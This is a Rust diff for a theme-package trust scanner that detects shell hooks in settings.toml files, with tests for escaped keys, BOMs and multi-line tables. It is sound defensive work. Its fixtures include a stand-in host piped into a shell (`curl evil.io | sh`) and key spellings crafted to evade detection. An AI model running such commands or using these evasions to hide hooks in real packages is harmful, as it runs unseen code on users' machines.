@@ -30,7 +30,11 @@
 //! ever created) and TOTAL — a missing, unreadable, malformed, empty or
 //! non-UTF8 file never panics: it only narrows the report. Reading is
 //! line-based like every other `settings.toml` reader in the repo (there is
-//! no TOML crate).
+//! no TOML crate), and it FAILS CLOSED: a hooks table the line reader
+//! cannot read in full is reported as one conservative entry
+//! (`push_unreadable_hooks`) instead of an empty report, because the gate
+//! warns only when the report is non-empty and a silent gate over an
+//! unreadable table is CRITICAL-1 with a different spelling.
 
 use std::path::{Path, PathBuf};
 
@@ -39,11 +43,18 @@ use std::path::{Path, PathBuf};
 pub struct ShellHook {
     /// The provider directory that carries the file (e.g. `noctalia-v5`).
     pub provider: String,
-    /// The `[hooks]` key (`started`, `colors_changed`, `shutdown`, …).
+    /// The `[hooks]` key (`started`, `colors_changed`, `shutdown`, …) —
+    /// decoded when the file spells it as a TOML basic string with escapes
+    /// (`"\u0073tarted"` is `started` to a real parser). The ONE exception
+    /// is the conservative entry of an UNREADABLE hooks table, whose key
+    /// is the literal `hooks table` (a note about a table, never an event
+    /// that runs); see `push_unreadable_hooks`.
     pub key: String,
     /// The command text exactly as the file holds it, quotes stripped: a
     /// multi-line string arrives with its lines joined by newlines and its
-    /// delimiter padding trimmed.
+    /// delimiter padding trimmed. For the conservative entry it is the
+    /// honest statement that the table could not be fully read (file and
+    /// line), not a command.
     pub command: String,
 }
 
@@ -78,7 +89,10 @@ pub struct ThemeTrustReport {
     /// Every hooks command of every `providers/*/settings.toml` — spelled
     /// under `[hooks]` or as a root-level `hooks.*` key / `hooks = { … }`
     /// table — in provider-directory order (sorted) and file order inside a
-    /// file.
+    /// file. A hooks table the line reader CANNOT read in full appears as
+    /// one clearly-named conservative entry (key `hooks table`, stating
+    /// file + line) instead of an empty list: FAIL CLOSED, so the gate can
+    /// never stay silent over a table nobody inspected.
     pub shell_hooks: Vec<ShellHook>,
     /// Every preset file under `presets/<category>/` the report must name —
     /// what the apply installs AND can execute: `*.lua` anywhere, plus
@@ -140,7 +154,7 @@ fn shell_hooks(theme_dir: &Path) -> Vec<ShellHook> {
             continue;
         }
         match crate::theme_media::read_theme_record(&settings) {
-            Ok(text) => out.extend(hooks_in_settings(&text, &provider)),
+            Ok(text) => out.extend(hooks_in_settings(&text, &provider, &settings)),
             Err(e) => tracing::warn!(
                 "[theme-trust] cannot read {} (skipped): {}",
                 settings.display(),
@@ -151,7 +165,9 @@ fn shell_hooks(theme_dir: &Path) -> Vec<ShellHook> {
     out
 }
 
-/// The hooks one `settings.toml` text declares, in file order.
+/// The hooks one `settings.toml` text declares, in file order — plus, when
+/// a hooks table exists that this reader CANNOT read in full, one
+/// conservative entry ([`push_unreadable_hooks`]) instead of silence.
 ///
 /// One value can span LINES: a multi-line string (`"""` / `'''`) keeps every
 /// line inside it as CONTENT — not a section header, not a comment, not a
@@ -165,11 +181,25 @@ fn shell_hooks(theme_dir: &Path) -> Vec<ShellHook> {
 /// TOML parser, so both are read like a pair under the header (see
 /// [`root_hooks`]). After a header the same text is
 /// `<section>.hooks.started`, which Noctalia never executes, so it is left
-/// alone. Still line-based (no TOML crate): an inline table opened on one
-/// line and closed on a later one is INVALID TOML (a newline is only legal
-/// inside a value), so Noctalia's parser rejects such a file outright and
-/// nothing can execute from it.
-fn hooks_in_settings(text: &str, provider: &str) -> Vec<ShellHook> {
+/// alone.
+///
+/// Still line-based (no TOML crate), and it FAILS CLOSED on what it cannot
+/// read: an inline table whose closing `}` lands on a later line is VALID
+/// TOML under spec 1.1 — `toml` 1.1.2 (`+spec-1.1.0`, this repo's
+/// lockfile) parses `hooks = {\n  started = "…"\n}` — so a reader that
+/// cannot follow it across lines must report `push_unreadable_hooks`,
+/// never an empty report: the gate warns only when the report is
+/// non-empty, and the keeper cannot consent to a hooks table nobody
+/// inspected. (W1c claimed such a file was invalid TOML Noctalia "rejects
+/// outright"; that claim was FALSE for the spec-1.1 parser family — a
+/// false claim in a security comment is itself a defect.)
+///
+/// One leading UTF-8 BOM is stripped first: U+FEFF is not
+/// `char::is_whitespace`, so `trim()` never removed it and
+/// `<BOM>hooks.started = "…"` slipped past both readers while `toml`
+/// accepts the file (W1c-b).
+fn hooks_in_settings(text: &str, provider: &str, file: &Path) -> Vec<ShellHook> {
+    let text = text.strip_prefix('\u{feff}').unwrap_or(text);
     let mut out = Vec::new();
     let mut in_hooks = false;
     // Document ROOT: no `[section]` header has been seen yet. Only there do
@@ -177,37 +207,60 @@ fn hooks_in_settings(text: &str, provider: &str) -> Vec<ShellHook> {
     // name `<section>.hooks.*`, which Noctalia never runs.
     let mut root = true;
     // An OPEN multi-line string: (the key it belongs to, the delimiter that
-    // closes it, the content gathered so far).
-    let mut open: Option<(String, &'static str, String)> = None;
-    for line in text.split('\n') {
+    // closes it, the content gathered so far, the opener line of the
+    // root-level inline `hooks = { … }` table the string belongs to —
+    // `Some` only while that table's `}` is still missing).
+    let mut open: Option<(String, &'static str, String, Option<usize>)> = None;
+    for (index, line) in text.split('\n').enumerate() {
+        let line_no = index + 1;
         if open.is_some() {
-            let ended = {
-                let (_key, delimiter, content) = open.as_mut().expect("open is Some");
+            let ended_at = {
+                let (_key, delimiter, content, _inline) = open.as_mut().expect("open is Some");
                 match line.find(*delimiter) {
                     Some(at) => {
                         content.push_str(&line[..at]);
-                        true
+                        Some(at)
                     }
                     None => {
                         content.push('\n');
                         content.push_str(line);
-                        false
+                        None
                     }
                 }
             };
-            if ended {
-                let (key, _delimiter, content) = open.take().expect("open is Some");
+            if let Some(at) = ended_at {
+                let (key, delimiter, content, inline_opener) = open.take().expect("open is Some");
                 push_shell_hook(&mut out, provider, &key, content.trim());
+                // W1c-b FAIL CLOSED, deferred half: this string was an
+                // entry of a root-level `hooks = { … }` table that opened
+                // without its `}` (spec 1.1 allows the newline). The rest
+                // of THIS line must close that table with nothing but
+                // whitespace and separators before the `}` — anything else
+                // (more entries, or no `}` at all) was never read, so the
+                // conservative entry goes out beside what WAS read.
+                if let Some(opener) = inline_opener {
+                    let after = &line[at + delimiter.len()..];
+                    let mut pieces = split_outer(after, '}');
+                    let closes = pieces.len() > 1;
+                    let residue = pieces.swap_remove(0);
+                    let residue = residue
+                        .trim()
+                        .trim_matches(|c: char| c.is_whitespace() || c == ',');
+                    if !closes || !residue.is_empty() {
+                        push_unreadable_hooks(&mut out, provider, file, opener);
+                    }
+                }
             }
             continue;
         }
-        if let Some(section) = section_name(line) {
-            in_hooks = section == "hooks" || section.starts_with("hooks.");
+        if let Some(keys) = section_keys(line) {
+            in_hooks = keys.first().map(String::as_str) == Some("hooks");
             root = false;
             continue;
         }
         if !in_hooks {
             if root {
+                let mut unread_inline: Option<usize> = None;
                 for item in root_hooks(line) {
                     match item {
                         RootHook::Pair(key, command) => {
@@ -217,27 +270,47 @@ fn hooks_in_settings(text: &str, provider: &str) -> Vec<ShellHook> {
                             key,
                             delimiter,
                             head,
-                        } => open = Some((key, delimiter, head)),
+                        } => open = Some((key, delimiter, head, None)),
+                        RootHook::UnreadInline => unread_inline = Some(line_no),
+                    }
+                }
+                if let Some(opener) = unread_inline {
+                    match open.as_mut() {
+                        // The opener line also opened a multi-line STRING:
+                        // only the line where that string ends can still
+                        // close the table (or prove it unreadable), so the
+                        // decision is deferred there — no double warning
+                        // and no wrong one.
+                        Some(slot) => slot.3 = Some(opener),
+                        // Nothing on this line could be read as an entry of
+                        // the table: fail closed right here.
+                        None => push_unreadable_hooks(&mut out, provider, file, opener),
                     }
                 }
             }
             continue;
         }
         match hook_line(line) {
-            HookLine::Pair(key, command) => push_shell_hook(&mut out, provider, key, command),
+            HookLine::Pair(key, command) => push_shell_hook(&mut out, provider, &key, command),
             HookLine::OpenMulti {
                 key,
                 delimiter,
                 head,
-            } => open = Some((key.to_string(), delimiter, head.to_string())),
+            } => open = Some((key, delimiter, head.to_string(), None)),
             HookLine::None => {}
         }
     }
     // An UNTERMINATED multi-line string is not valid TOML (Noctalia would
     // refuse the whole file), but this is a detector: report what can be
-    // read — the same rule as an unterminated single-line quote.
-    if let Some((key, _delimiter, content)) = open {
+    // read — the same rule as an unterminated single-line quote. An inline
+    // table whose string never ended never closed either: whatever the
+    // table still carries was never read, so the conservative entry goes
+    // out with it.
+    if let Some((key, _delimiter, content, inline_opener)) = open {
         push_shell_hook(&mut out, provider, &key, content.trim());
+        if let Some(opener) = inline_opener {
+            push_unreadable_hooks(&mut out, provider, file, opener);
+        }
     }
     out
 }
@@ -255,19 +328,50 @@ fn push_shell_hook(out: &mut Vec<ShellHook>, provider: &str, key: &str, command:
     });
 }
 
-/// The section name a `settings.toml` header line declares, `None` for every
+/// The ONE conservative report entry emitted when the line reader KNOWS it
+/// could not read a hooks table in full (W1c-b): for a form there is no
+/// confident reading of — today the spec-1.1 multi-line inline table — it
+/// must warn, never read as empty, because the gate warns only when the
+/// report is non-empty and the keeper cannot consent to what nobody
+/// inspected. It names a TABLE, not an event (`key` is `hooks table`, so
+/// the warning line reads as a note, not as a hook that runs); it states
+/// the file, the line where the table opens, and that the list may be
+/// incomplete. It claims no protection and invents no command: it is an
+/// honest "I could not read this", not a sandbox.
+fn push_unreadable_hooks(out: &mut Vec<ShellHook>, provider: &str, file: &Path, line: usize) {
+    out.push(ShellHook {
+        provider: provider.to_string(),
+        key: "hooks table".to_string(),
+        command: format!(
+            "the hooks table in {} (line {}) could not be fully read by this scan; \
+             it may carry shell commands that are not listed here",
+            file.display(),
+            line
+        ),
+    });
+}
+
+/// The key parts a `settings.toml` header line declares, `None` for every
 /// other line. House convention (same as `providers/noctalia.rs`): in a
 /// machine-written file a `#` always starts a comment, so the code is the
 /// line up to the first `#`.
 ///
-/// A QUOTED header (`["hooks"]`, `['hooks']`) is the SAME table as
-/// `[hooks]` — plain TOML Noctalia's own parser honours — so the quotes are
-/// stripped: keeping them in the name skipped the whole section and hid
-/// every hook in it from the gate.
-fn section_name(line: &str) -> Option<&str> {
+/// Every part is decoded like every other key comparison ([`decode_key`])
+/// and the caller reads the FIRST part, so all of these are the hooks
+/// table — each one is to a real parser: a quoted header (`["hooks"]`,
+/// `['hooks']`; keeping the quotes hid the whole section from the gate,
+/// the original W1 finding), an escaped basic string (`["\u0068ooks"]`,
+/// W1c-b), spaces around the dots (`[hooks . started]`) and a quoted
+/// first part (`["hooks".started]`).
+fn section_keys(line: &str) -> Option<Vec<String>> {
     let code = line.split('#').next().unwrap_or("").trim();
     let name = code.strip_prefix('[')?.strip_suffix(']')?.trim();
-    Some(unquote(name))
+    Some(
+        split_outer(name, '.')
+            .iter()
+            .map(|part| decode_key(part.trim()))
+            .collect(),
+    )
 }
 
 /// Strip ONE matching pair of surrounding quotes (`"` or `'`) from a table
@@ -281,16 +385,102 @@ fn unquote(name: &str) -> &str {
     name
 }
 
+/// The key text a TOML parser builds from ONE key part — used wherever a
+/// key is COMPARED or reported, because the comparison must see what a
+/// real parser sees (W1c-b):
+///
+/// - a BASIC string (`"…"`) is DECODED: `\uXXXX`, `\UXXXXXXXX` and the
+///   simple escapes (`\b \t \n \f \r \" \\`) are part of the key itself,
+///   so `"\u0068ooks"` IS the table `hooks` (verified against `toml` 1.1.2,
+///   `+spec-1.1.0` — this repo's lockfile);
+/// - a LITERAL string (`'…'`) and a bare key come back with the quotes
+///   stripped and NO decoding: TOML literal strings have no escapes, so
+///   `'\u0068ooks'` is that literal key and must never be read as `hooks`
+///   (the parser would not run it);
+/// - an escape the parser would REJECT (wrong hex count, a surrogate
+///   scalar) stays VERBATIM instead of decoding into a table name —
+///   garbage input must not become a table this gate reports.
+fn decode_key(part: &str) -> String {
+    let bytes = part.as_bytes();
+    if bytes.len() >= 2 && bytes[0] == b'"' && bytes[bytes.len() - 1] == b'"' {
+        return decode_basic_string(&part[1..bytes.len() - 1]);
+    }
+    unquote(part).to_string()
+}
+
+/// The content of a TOML BASIC string with its escapes applied. An unknown
+/// escape (invalid TOML) is kept verbatim — backslash and character — so
+/// an unreadable key stays unreadable instead of decoding into something
+/// this detector would report.
+fn decode_basic_string(content: &str) -> String {
+    if !content.contains('\\') {
+        return content.to_string();
+    }
+    let chars: Vec<char> = content.chars().collect();
+    let mut out = String::with_capacity(content.len());
+    let mut i = 0;
+    while i < chars.len() {
+        let c = chars[i];
+        i += 1;
+        if c != '\\' {
+            out.push(c);
+            continue;
+        }
+        let Some(&escaped) = chars.get(i) else {
+            out.push('\\');
+            break;
+        };
+        i += 1;
+        match escaped {
+            'b' => out.push('\u{8}'),
+            't' => out.push('\t'),
+            'n' => out.push('\n'),
+            'f' => out.push('\u{c}'),
+            'r' => out.push('\r'),
+            '"' => out.push('"'),
+            '\\' => out.push('\\'),
+            marker @ ('u' | 'U') => {
+                let digits = if marker == 'u' { 4 } else { 8 };
+                let rest = &chars[i..];
+                if rest.len() >= digits && rest[..digits].iter().all(char::is_ascii_hexdigit) {
+                    let hex: String = rest[..digits].iter().collect();
+                    match u32::from_str_radix(&hex, 16).ok().and_then(char::from_u32) {
+                        Some(decoded) => {
+                            out.push(decoded);
+                            i += digits;
+                        }
+                        // A surrogate or out-of-range scalar is not a
+                        // character: keep the escape as text.
+                        None => {
+                            out.push('\\');
+                            out.push(marker);
+                        }
+                    }
+                } else {
+                    out.push('\\');
+                    out.push(marker);
+                }
+            }
+            other => {
+                out.push('\\');
+                out.push(other);
+            }
+        }
+    }
+    out
+}
+
 /// One `key = value` line of a `[hooks]` section, as the line reader must
 /// treat it.
 enum HookLine<'a> {
-    /// A complete single-line value: the key and its command text.
-    Pair(&'a str, &'a str),
+    /// A complete single-line value: the key (decoded, [`decode_key`])
+    /// and its command text.
+    Pair(String, &'a str),
     /// A MULTI-LINE string (`"""` / `'''`) this line OPENS: the key it
     /// belongs to, the delimiter that closes it, and whatever content the
     /// opener line already carries after that delimiter.
     OpenMulti {
-        key: &'a str,
+        key: String,
         delimiter: &'static str,
         head: &'a str,
     },
@@ -314,19 +504,17 @@ fn hook_line(line: &str) -> HookLine<'_> {
     let Some(eq_at) = code.find('=') else {
         return HookLine::None;
     };
-    let mut key = code[..eq_at].trim();
-    if key.is_empty() {
+    let raw_key = code[..eq_at].trim();
+    if raw_key.is_empty() {
         return HookLine::None;
     }
-    // A quoted key (`"started" = …`) is legal TOML; report the bare name.
-    if key.len() >= 2
-        && ((key.starts_with('"') && key.ends_with('"'))
-            || (key.starts_with('\'') && key.ends_with('\'')))
-    {
-        key = &key[1..key.len() - 1];
-        if key.is_empty() {
-            return HookLine::None;
-        }
+    // A quoted key (`"started" = …`) is legal TOML: report the bare name,
+    // decoding a BASIC string first (W1c-b — `"\u0073tarted"` IS `started`
+    // to a real parser); a LITERAL string key has no escapes and keeps its
+    // text (see [`decode_key`]). An empty decoded key (`""`) is no key.
+    let key = decode_key(raw_key);
+    if key.is_empty() {
+        return HookLine::None;
     }
     let after = &line[eq_at + 1..];
     let value_at = eq_at + 1 + (after.len() - after.trim_start().len());
@@ -378,8 +566,10 @@ fn hook_line(line: &str) -> HookLine<'_> {
 }
 
 /// One root-level hook spelling read from ONE line: a finished
-/// `key = command` pair, or a MULTI-LINE string this line OPENS — the
-/// caller keeps collecting it exactly like a `[hooks]` multi-line value.
+/// `key = command` pair, a MULTI-LINE string this line OPENS, or the
+/// signal that an inline `hooks = { … }` table spans LINES and cannot be
+/// read — the caller keeps collecting the string and fails closed on the
+/// table.
 #[derive(Debug)]
 enum RootHook {
     /// A complete single-line value: the key INSIDE the hooks table and
@@ -393,6 +583,15 @@ enum RootHook {
         delimiter: &'static str,
         head: String,
     },
+    /// This line OPENS a root-level `hooks = { … }` inline table whose
+    /// closing `}` is not on the line. Under TOML spec 1.1 that is a
+    /// VALID multi-line inline table (verified: `toml` 1.1.2 parses it),
+    /// which this line-based reader cannot follow across lines — so the
+    /// caller must report [`push_unreadable_hooks`] instead of an empty
+    /// report. If the same line also produced an [`RootHook::OpenMulti`],
+    /// only the line where that string ends can still close the table:
+    /// the caller defers the decision there instead of warning twice.
+    UnreadInline,
 }
 
 /// The hooks ONE line written at the document ROOT declares (empty for
@@ -411,7 +610,14 @@ enum RootHook {
 /// The VALUE rules are [`hook_line`]'s, so a command is reported exactly
 /// like a pair under the `[hooks]` header; only the key differs: the report
 /// carries the key INSIDE the hooks table (`started`), never the dotted
-/// text (`hooks.started`).
+/// text (`hooks.started`). Keys are decoded like every comparison
+/// ([`decode_key`]), so `"\u0068ooks"."started"` is the same spelling.
+///
+/// An inline table opened WITHOUT its `}` on the same line is a spec-1.1
+/// multi-line table this reader cannot follow across lines: whatever is
+/// readable on the opener line is still reported, plus
+/// [`RootHook::UnreadInline`] so the caller fails closed instead of
+/// reading as empty.
 fn root_hooks(line: &str) -> Vec<RootHook> {
     // House convention (same as `hook_line`): a `#` starts a comment.
     let code = line.split('#').next().unwrap_or("").trim();
@@ -423,9 +629,9 @@ fn root_hooks(line: &str) -> Vec<RootHook> {
     };
     // Split the key on the dots OUTSIDE quotes: only those are real key
     // separators (see the doc above).
-    let names: Vec<&str> = split_outer(&code[..eq_at], '.')
+    let names: Vec<String> = split_outer(&code[..eq_at], '.')
         .iter()
-        .map(|part| unquote(part.trim()))
+        .map(|part| decode_key(part.trim()))
         .collect();
     if names.is_empty() || names.iter().any(|name| name.is_empty()) {
         return Vec::new();
@@ -446,7 +652,7 @@ fn root_hooks(line: &str) -> Vec<RootHook> {
         };
     }
     // The inline-table spelling: `hooks = { … }`. A `hooks` value that is
-    // not a table (`hooks = "…"`) is not the hooks table.
+    // not a table (`hooks = "…"`, an array) is not the hooks table.
     if names.len() != 1 || names[0] != "hooks" {
         return Vec::new();
     }
@@ -455,14 +661,23 @@ fn root_hooks(line: &str) -> Vec<RootHook> {
         return Vec::new();
     };
     // Cut the body at the closing `}` (quote-aware: a `}` inside a command
-    // string closes nothing). A line without it is truncated garbage; the
-    // detector parses what is there — the same tolerance as an unterminated
-    // quote.
-    let body = split_outer(body, '}').swap_remove(0);
-    split_outer(body, ',')
+    // string closes nothing). A line WITHOUT that closing brace is not
+    // "truncated garbage to parse as far as it goes": with the `}` on a
+    // later line it is a VALID multi-line inline table under TOML spec 1.1
+    // (the W1c comment claiming otherwise was false — `toml` 1.1.2 parses
+    // it), and this reader cannot follow it. Whatever is readable on THIS
+    // line is reported, plus `UnreadInline` to fail closed (see above).
+    let mut pieces = split_outer(body, '}');
+    let closed = pieces.len() > 1;
+    let body = pieces.swap_remove(0);
+    let mut out: Vec<RootHook> = split_outer(body, ',')
         .iter()
         .filter_map(|entry| inline_hook_entry(entry))
-        .collect()
+        .collect();
+    if !closed {
+        out.push(RootHook::UnreadInline);
+    }
+    out
 }
 
 /// One `key = value` entry inside a root-level `hooks = { … }` inline
@@ -476,16 +691,16 @@ fn inline_hook_entry(entry: &str) -> Option<RootHook> {
         return None;
     }
     let eq_at = entry.find('=')?;
-    let key_parts: Vec<&str> = split_outer(&entry[..eq_at], '.')
+    let key_parts: Vec<String> = split_outer(&entry[..eq_at], '.')
         .iter()
-        .map(|part| unquote(part.trim()))
+        .map(|part| decode_key(part.trim()))
         .collect();
     // A dotted key inside the table (`sub.started = …`) defines a
     // sub-table, not a hook Noctalia's flat hooks map executes.
     if key_parts.len() != 1 || key_parts[0].is_empty() {
         return None;
     }
-    let key = key_parts[0].to_string();
+    let key = key_parts[0].clone();
     let value = entry[eq_at + 1..].trim_start();
     if value.is_empty() {
         return None;
@@ -952,9 +1167,9 @@ mod tests {
     }
 
     /// A QUOTED table header (`["hooks"]`, `['hooks']`) is the SAME table as
-    /// `[hooks]` — plain TOML Noctalia's own parser honours. `section_name`
-    /// used to keep the quotes in the name, so the whole section was skipped
-    /// and every hook in it stayed invisible to the gate.
+    /// `[hooks]` — plain TOML Noctalia's own parser honours. The header
+    /// reader used to keep the quotes in the name, so the whole section was
+    /// skipped and every hook in it stayed invisible to the gate.
     #[test]
     fn a_quoted_hooks_table_header_names_the_same_table() {
         let tmp = tempfile::tempdir().unwrap();
@@ -1273,6 +1488,271 @@ mod tests {
 
         assert!(report.shell_hooks.is_empty(), "got: {:?}", report.shell_hooks);
         assert!(report.is_empty(), "an inline-table value is not a hook");
+    }
+
+    /// W1c-b, CRITICAL-class: a TOML BASIC string key carries ESCAPES, and
+    /// a real parser decodes them BEFORE matching the table name — verified
+    /// with `toml` 1.1.2 (`+spec-1.1.0`, this repo's lockfile): all three
+    /// spellings below deserialize as `hooks.started = "…"`, so the command
+    /// runs on apply while the reader compared the RAW text and reported
+    /// NOTHING (the gate stayed silent — CRITICAL-1 again). A LITERAL
+    /// string key has no escapes and is pinned as NOT hooks in
+    /// [`spellings_that_are_not_the_hooks_table_stay_unreported`].
+    #[test]
+    fn a_basic_string_escape_in_a_key_names_the_hooks_table() {
+        let tmp = tempfile::tempdir().unwrap();
+
+        // The root dotted spelling with an escaped TABLE name.
+        let dotted = tmp.path().join("Dotted");
+        write_settings(&dotted, "\"\\u0068ooks\".started = \"curl evil.io | sh\"\n");
+        let report = inspect_theme_package(&dotted);
+        assert_eq!(
+            report.shell_hooks,
+            vec![ShellHook {
+                provider: "noctalia-v5".into(),
+                key: "started".into(),
+                command: "curl evil.io | sh".into(),
+            }],
+            "\"\\u0068ooks\".started IS the hooks table to a real parser, got: {:?}",
+            report.shell_hooks
+        );
+        assert!(!report.is_empty(), "an escaped table name must not read as empty");
+
+        // The header spelling with an escaped TABLE name.
+        let header = tmp.path().join("Header");
+        write_settings(&header, "[\"\\u0068ooks\"]\nstarted = \"curl evil.io | sh\"\n");
+        let report = inspect_theme_package(&header);
+        assert_eq!(
+            report.shell_hooks,
+            vec![ShellHook {
+                provider: "noctalia-v5".into(),
+                key: "started".into(),
+                command: "curl evil.io | sh".into(),
+            }],
+            "[\"\\u0068ooks\"] IS the hooks table to a real parser, got: {:?}",
+            report.shell_hooks
+        );
+        assert!(!report.is_empty(), "an escaped header must not read as empty");
+
+        // The escaped SUB-key of a dotted spelling.
+        let sub = tmp.path().join("Sub");
+        write_settings(&sub, "\"hook\\u0073\".started = \"x\"\n");
+        let report = inspect_theme_package(&sub);
+        assert_eq!(
+            report.shell_hooks,
+            vec![ShellHook {
+                provider: "noctalia-v5".into(),
+                key: "started".into(),
+                command: "x".into(),
+            }],
+            "\"hook\\u0073\".started IS the hooks table to a real parser, got: {:?}",
+            report.shell_hooks
+        );
+        assert!(report.lua_presets.is_empty(), "these fixtures carry no presets");
+    }
+
+    /// W1c-b, CRITICAL-class: a UTF-8 BOM (U+FEFF) is accepted at the
+    /// start of a TOML file and is NOT `char::is_whitespace`, so `trim()`
+    /// never removed it — `<BOM>hooks.started = "…"` slipped past the root
+    /// reader and a BOM before the first header slipped past the section
+    /// reader (both PARSED as hooks by `toml` 1.1.2), while the command
+    /// runs on apply and the gate saw an EMPTY report.
+    #[test]
+    fn a_leading_utf8_bom_does_not_hide_the_hooks_table() {
+        let tmp = tempfile::tempdir().unwrap();
+
+        let dotted = tmp.path().join("Dotted");
+        write_settings(&dotted, "\u{feff}hooks.started = \"curl evil.io | sh\"\n");
+        let report = inspect_theme_package(&dotted);
+        assert_eq!(
+            report.shell_hooks,
+            vec![ShellHook {
+                provider: "noctalia-v5".into(),
+                key: "started".into(),
+                command: "curl evil.io | sh".into(),
+            }],
+            "a BOM before a root-level hooks key must not hide it, got: {:?}",
+            report.shell_hooks
+        );
+        assert!(!report.is_empty(), "a BOM'd root-level hook must not read as empty");
+
+        let header = tmp.path().join("Header");
+        write_settings(&header, "\u{feff}[hooks]\nstarted = \"curl evil.io | sh\"\n");
+        let report = inspect_theme_package(&header);
+        assert_eq!(
+            report.shell_hooks,
+            vec![ShellHook {
+                provider: "noctalia-v5".into(),
+                key: "started".into(),
+                command: "curl evil.io | sh".into(),
+            }],
+            "a BOM before the first header must not hide the section, got: {:?}",
+            report.shell_hooks
+        );
+        assert!(!report.is_empty(), "a BOM'd header hook must not read as empty");
+    }
+
+    /// W1c-b, FAIL CLOSED: a multi-line inline table is VALID TOML under
+    /// spec 1.1 — `toml` 1.1.2 parses `hooks = {\n  started = "…"\n}` —
+    /// and the W1c comment claiming such a file is rejected was FALSE.
+    /// This line-based reader cannot follow the table across lines, so it
+    /// must report ONE clearly-named conservative entry (naming the file
+    /// and the opener line, stating the report may be incomplete) instead
+    /// of an EMPTY report: the keeper cannot consent to what nobody
+    /// inspected. An unclosed opener whose only command is EMPTY must not
+    /// fall back to an empty report either.
+    #[test]
+    fn a_multi_line_inline_hooks_table_reports_a_conservative_entry_not_an_empty_report() {
+        let tmp = tempfile::tempdir().unwrap();
+        let theme = tmp.path().join("Theme");
+        write_settings(&theme, "hooks = {\nstarted = \"curl evil.io | sh\"\n}\n");
+        let settings = theme.join("providers").join("noctalia-v5").join("settings.toml");
+
+        let report = inspect_theme_package(&theme);
+
+        assert_eq!(
+            report.shell_hooks,
+            vec![ShellHook {
+                provider: "noctalia-v5".into(),
+                key: "hooks table".into(),
+                command: format!(
+                    "the hooks table in {} (line 1) could not be fully read by this scan; \
+                     it may carry shell commands that are not listed here",
+                    settings.display()
+                ),
+            }],
+            "an unreadable hooks table must produce exactly one conservative entry, got: {:?}",
+            report.shell_hooks
+        );
+        assert!(!report.is_empty(), "an unreadable hooks table must never read as empty");
+        assert!(report.lua_presets.is_empty(), "this fixture carries no presets");
+
+        // The gate holds on it: the keeper sees the line
+        // `{key} — {command}` built from this very entry.
+        let mut gate = TrustGate::new();
+        assert_eq!(
+            gate.request("Theme", 0, ApplyOrigin::Gallery, &report),
+            GateDecision::Hold,
+            "the conservative entry must hold the apply behind the warning"
+        );
+
+        // An unclosed opener whose only command is EMPTY: the empty
+        // command is not a hook, but the table still cannot be read, so
+        // the report must not fall back to empty either.
+        let unclosed = tmp.path().join("Unclosed");
+        write_settings(&unclosed, "hooks = { started = \"\"\n");
+        let report = inspect_theme_package(&unclosed);
+        assert_eq!(report.shell_hooks.len(), 1, "got: {:?}", report.shell_hooks);
+        assert_eq!(
+            report.shell_hooks[0].key, "hooks table",
+            "the conservative entry must be clearly named, got: {:?}",
+            report.shell_hooks
+        );
+        assert!(!report.is_empty(), "an unclosed hooks table must never read as empty");
+    }
+
+    /// W1c-b, FAIL CLOSED (the deferred half): when the multi-line string
+    /// an inline table OPENS finally ends, the rest of that line can carry
+    /// more entries (`""", shutdown = "evil" }`). This reader never reads
+    /// them, so the conservative entry must still be reported — next to
+    /// the entries it DID read, so the gate holds and the keeper learns
+    /// the list in front of him is incomplete.
+    #[test]
+    fn entries_after_a_multi_line_string_in_an_inline_table_still_fail_closed() {
+        let tmp = tempfile::tempdir().unwrap();
+        let theme = tmp.path().join("Theme");
+        write_settings(
+            &theme,
+            "hooks = { started = \"\"\"\npkill -x sddm-watch\n\"\"\", shutdown = \"evil\" }\n",
+        );
+        let settings = theme.join("providers").join("noctalia-v5").join("settings.toml");
+
+        let report = inspect_theme_package(&theme);
+
+        assert_eq!(
+            report.shell_hooks,
+            vec![
+                ShellHook {
+                    provider: "noctalia-v5".into(),
+                    key: "started".into(),
+                    command: "pkill -x sddm-watch".into(),
+                },
+                ShellHook {
+                    provider: "noctalia-v5".into(),
+                    key: "hooks table".into(),
+                    command: format!(
+                        "the hooks table in {} (line 1) could not be fully read by this scan; \
+                         it may carry shell commands that are not listed here",
+                        settings.display()
+                    ),
+                },
+            ],
+            "the entries after the multi-line string were never read: report the \
+             conservative entry beside what was read, got: {:?}",
+            report.shell_hooks
+        );
+        assert!(!report.is_empty());
+    }
+
+    /// The correctly-NOT-reported spellings (a parser would not run them,
+    /// so warning on them would nag the keeper over nothing) stay silent —
+    /// they pin that decoding basic-string keys did NOT widen the gate: a
+    /// LITERAL string key has no escapes in TOML (`'\u0068ooks'` is that
+    /// literal key, verified against `toml` 1.1.2), `hooksx.started` and
+    /// one quoted key with a dot inside are not the table, `[[hooks]]` is
+    /// an array of tables Noctalia never deserializes as its hooks map,
+    /// and `hooks = {}` is a readable, EMPTY table. Characterization: this
+    /// must be green before AND after the fix.
+    #[test]
+    fn spellings_that_are_not_the_hooks_table_stay_unreported() {
+        let tmp = tempfile::tempdir().unwrap();
+
+        let literal = tmp.path().join("Literal");
+        write_settings(&literal, "['\\u0068ooks']\nstarted = \"x\"\n");
+        assert!(
+            inspect_theme_package(&literal).is_empty(),
+            "a literal string key has no escapes: '\\u0068ooks' is NOT the hooks table"
+        );
+
+        let near_miss = tmp.path().join("NearMiss");
+        write_settings(&near_miss, "hooksx.started = \"x\"\n");
+        assert!(
+            inspect_theme_package(&near_miss).is_empty(),
+            "hooksx.started is not the hooks table"
+        );
+
+        let array = tmp.path().join("Array");
+        write_settings(&array, "[[hooks]]\nstarted = \"x\"\n");
+        assert!(
+            inspect_theme_package(&array).is_empty(),
+            "[[hooks]] is an array of tables, not the hooks map"
+        );
+
+        let empty = tmp.path().join("Empty");
+        write_settings(&empty, "hooks = {}\n");
+        assert!(
+            inspect_theme_package(&empty).is_empty(),
+            "hooks = {{}} is a readable empty table"
+        );
+    }
+
+    /// The key decoder itself: a BASIC string (`"…"`) decodes `\uXXXX`,
+    /// `\UXXXXXXXX` and the simple escapes; a LITERAL string (`'…'`) and
+    /// a bare key come back verbatim (TOML literal strings have no
+    /// escapes); an escape the parser would REJECT (wrong hex, a
+    /// surrogate scalar) stays verbatim instead of decoding into a table
+    /// name this gate would then report.
+    #[test]
+    fn a_basic_string_key_decoder_decodes_escapes_and_keeps_literal_strings_verbatim() {
+        assert_eq!(decode_key("\"\\u0068ooks\""), "hooks");
+        assert_eq!(decode_key("\"\\U00000068ooks\""), "hooks");
+        assert_eq!(decode_key("\"a\\b\\t\\n\\f\\r\""), "a\u{8}\t\n\u{c}\r");
+        assert_eq!(decode_key("\"q\\\"b\""), "q\"b");
